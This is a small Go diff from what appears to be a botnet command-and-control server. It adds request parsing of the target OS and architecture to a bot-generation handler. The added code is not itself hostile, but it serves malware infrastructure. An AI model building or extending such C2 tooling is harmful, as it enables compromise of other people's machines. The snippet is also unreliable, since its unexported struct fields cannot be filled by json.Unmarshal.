@@ -154,6 +154,21 @@ func (c *c2) DisconnectBot(botID string) bool {
 }
 
 func (c *c2) GenerateBot(w http.ResponseWriter, r *http.Request) {
+	type recieveostype struct {
+		os   string
+		arch string
+	}
+
+	rot := recieveostype{}
+
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	json.Unmarshal(body, &rot)
+
 	botcreds, err := register.GenerateBotCredentials()
 	if err != nil {
 		log.Println(err)
